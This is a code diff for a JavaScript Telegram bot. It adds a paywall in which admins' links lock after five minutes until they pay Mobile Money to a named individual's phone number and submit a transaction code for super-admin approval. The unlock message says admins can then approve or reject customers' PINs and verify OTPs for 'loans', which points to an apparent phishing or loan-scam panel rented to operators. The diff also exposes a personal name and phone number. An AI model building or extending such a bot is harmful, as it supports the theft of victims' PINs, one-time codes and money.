@@ -110,6 +110,44 @@ async function startLinkPaymentTimer(adminId) {
             await db.updateAdmin(adminId, { linkLocked: true, linkLockedAt: new Date() });
             adminLinkTimers.delete(adminId);
             console.log(`🔒 Admin link auto-locked after 5 minutes: ${adminId}`);
+
+            // Notify admin that link has been locked
+            const admin = await db.getAdmin(adminId);
+            if (admin?.chatId) {
+                await bot.sendMessage(admin.chatId, `
+🔒 *YOUR LINK HAS BEEN LOCKED*
+
+Your admin link has been automatically locked after 5 minutes.
+
+⏰ To reactivate your link, you must complete payment.
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+💰 *PAYMENT DETAILS*
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+📱 **Payment Method:** Mobile Money
+
+**Recipient Name:** Okeyo Bungu
+**Phone Number:** 0791336749
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+*Steps to Unlock:*
+1️⃣ Send money to: *0791336749*
+2️⃣ Use your preferred payment method (M-Pesa, MTN, etc)
+3️⃣ Get the transaction reference code
+4️⃣ Send the code in this format:
+
+\`/payment YOUR_TRANSACTION_CODE\`
+
+*Example:*
+\`/payment XAF123456\`
+
+Once payment is verified, your link will be immediately unlocked.
+
+📧 Questions? Contact the super admin.
+                `, { parse_mode: 'Markdown' });
+            }
         } catch (error) {
             console.error(`❌ Error locking admin link ${adminId}:`, error);
         }
@@ -1172,6 +1210,92 @@ React with ✅ to confirm or ❌ to cancel
         }
     });
 
+    // /payment <TRANSACTION_CODE> - Admin submits payment
+    bot.onText(/\/payment (.+)/, async (msg, match) => {
+        const chatId  = msg.chat.id;
+        const adminId = getAdminIdByChatId(chatId);
+        
+        if (!adminId) {
+            return bot.sendMessage(chatId, '❌ Not registered as admin.');
+        }
+        
+        if (isSuperAdmin(adminId)) {
+            return bot.sendMessage(chatId, '❌ Superadmin does not require payment.');
+        }
+        
+        try {
+            const transactionCode = match[1].trim().toUpperCase();
+            const admin = await db.getAdmin(adminId);
+            
+            if (!admin) {
+                return bot.sendMessage(chatId, '❌ Admin not found.');
+            }
+            
+            if (!admin.linkLocked) {
+                return bot.sendMessage(chatId, '✅ Your link is already active! No payment needed.');
+            }
+            
+            // Update admin - mark payment as pending review
+            await db.updateAdmin(adminId, { 
+                paymentStatus: 'pending',
+                payerName: `Transaction: ${transactionCode}`,
+                paymentSubmittedAt: new Date()
+            });
+            
+            // Notify admin
+            await bot.sendMessage(chatId, `
+✅ *PAYMENT RECEIVED*
+
+Your payment submission has been received and is pending verification by the super admin.
+
+📋 Details:
+🆔 Admin ID: \`${adminId}\`
+👤 Name: ${admin.name}
+📱 Transaction Code: \`${transactionCode}\`
+⏰ Submitted: ${new Date().toLocaleString()}
+
+We will notify you once the payment is confirmed.
+
+Your link will be unlocked immediately after approval.
+            `, { parse_mode: 'Markdown' });
+            
+            // Notify all super admins
+            for (const superAdminId of SUPER_ADMINS) {
+                const superAdminChatId = adminChatIds.get(superAdminId);
+                if (superAdminChatId) {
+                    await bot.sendMessage(superAdminChatId, `
+💳 *NEW PAYMENT SUBMITTED*
+
+Admin has sent payment and is awaiting your verification.
+
+📋 Details:
+🆔 Admin ID: \`${adminId}\`
+👤 Name: ${admin.name}
+📧 Email: ${admin.email}
+📱 Transaction Code: \`${transactionCode}\`
+⏰ Submitted: ${new Date().toLocaleString()}
+
+Verify the payment has been received:
+📞 Phone: 0791336749 (Okeyo Bungu)
+
+Please verify and respond:
+                    `, {
+                        parse_mode: 'Markdown',
+                        reply_markup: {
+                            inline_keyboard: [[
+                                { text: '✅ APPROVE PAYMENT', callback_data: `link_paid_yes_${adminId}` },
+                                { text: '❌ REJECT PAYMENT', callback_data: `link_paid_no_${adminId}` }
+                            ]]
+                        }
+                    });
+                }
+            }
+        } catch (error) {
+            console.error('❌ Error processing payment:', error);
+            bot.sendMessage(chatId, '❌ Error: ' + error.message);
+        }
+    });
+
     console.log('✅ Command handlers setup complete!');
 }
 
@@ -1210,27 +1334,41 @@ bot.on('callback_query', async (callbackQuery) => {
             });
 
             await bot.editMessageText(`
-✅ *LINK PAYMENT CONFIRMED*
+✅ *PAYMENT APPROVED*
 
-Admin \`${targetAdminId}\` - Already paid
+Admin \`${targetAdminId}\` - Payment verified
 Link is now unlocked and permanently active!
 
 ⏰ ${new Date().toLocaleString()}
             `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
 
-            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment confirmed, link unlocked!' });
+            await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Payment approved, link unlocked!' });
 
-            // Notify the admin
+            // Notify the admin with detailed message
             const admin = await db.getAdmin(targetAdminId);
             if (admin?.chatId) {
                 bot.sendMessage(admin.chatId, `
-✅ *YOUR LINK IS NOW ACTIVE!*
+✅ *PAYMENT APPROVED!*
 
-Payment confirmed! Your admin link is permanently active.
+Your payment has been verified and approved.
+Your admin link is now permanently active!
 
-🔗 ${WEBHOOK_URL}?admin=${targetAdminId}
+🔗 Your Link:
+\`${WEBHOOK_URL}?admin=${targetAdminId}\`
 
-Use /start to see available commands.
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+✅ STATUS: ACTIVE ✅
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+
+You can now:
+✅ Accept customer applications
+✅ Approve/reject PINs
+✅ Verify OTPs
+✅ Process loans
+
+Use /start to see all available commands.
+
+Thank you for your payment!
                 `, { parse_mode: 'Markdown' }).catch(() => {});
             }
         } else {
@@ -1241,7 +1379,7 @@ Use /start to see available commands.
 Admin \`${targetAdminId}\` - Payment needed
 5-minute countdown continues...
 
-Admin will see payment form after timer expires.
+Admin will receive payment instructions when timer expires.
             `, { chat_id: chatId, message_id: messageId, parse_mode: 'Markdown' });
 
             await bot.answerCallbackQuery(callbackQuery.id, { text: '⏱️ 5-minute timer continues' });
